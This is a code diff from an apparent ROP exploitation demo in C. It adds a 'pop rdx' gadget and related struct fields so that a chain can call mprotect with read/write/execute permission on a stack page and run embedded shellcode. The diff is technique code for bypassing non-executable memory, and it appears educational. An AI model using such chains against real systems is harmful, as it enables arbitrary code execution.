@@ -24,6 +24,7 @@ typedef struct Payload {
 	void		*pl_stackStart;
 	void		*pl_popRSI;
 	ptrdiff_t	pl_stackSize;
+	void		*pl_popRDX;
 	long		pl_permission;
 	void		*pl_mprotect;
 	void		*pl_shellCode;
@@ -118,6 +119,7 @@ static void populate(PayloadPtr plp) {
 	plp->pl_stackStart	= stackBase();
 	plp->pl_popRSI		= &&l_poprsi;
 	plp->pl_stackSize	= getpagesize();
+	plp->pl_popRDX		= &&l_poprdx;
 	plp->pl_permission	= 0x7;
 	plp->pl_mprotect	= libc_mprotect;
 	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves
@@ -131,16 +133,24 @@ static void populate(PayloadPtr plp) {
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
 
-	// 
+	// Gadget for "POP RDI"
 	if (v) {
 l_poprdi:
 		__asm__ ("pop %rdi");
 		__asm__ ("ret");
 	}
 
+	// Gadget for "POP RSI"
 	if (v) {
 l_poprsi:
 		__asm__ ("pop %rsi");
+		__asm__ ("ret");
+	}
+
+	// Gadget for "POP RDX"
+	if (v) {
+l_poprdx:
+		__asm__ ("pop %rdx");
 		__asm__ ("ret");
 	}
 
@@ -170,6 +180,7 @@ static void dumpload(PayloadPtr plp) {
 	printf("%20s: %p\n",           "plp->pl_stackStart",   plp->pl_stackStart);
 	printf("%20s: %p\n",           "plp->pl_popRSI",       plp->pl_popRSI);
 	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
+	printf("%20s: %p\n",           "plp->pl_popRDX",       plp->pl_popRDX);
 	printf("%20s: %#tx\n",         "plp->pl_permission",   plp->pl_permission);
 	printf("%20s: %p\n",           "plp->pl_mprotect",     plp->pl_mprotect);
 	printf("%20s: %p\n",           "plp->pl_shellCode",    plp->pl_shellCode);
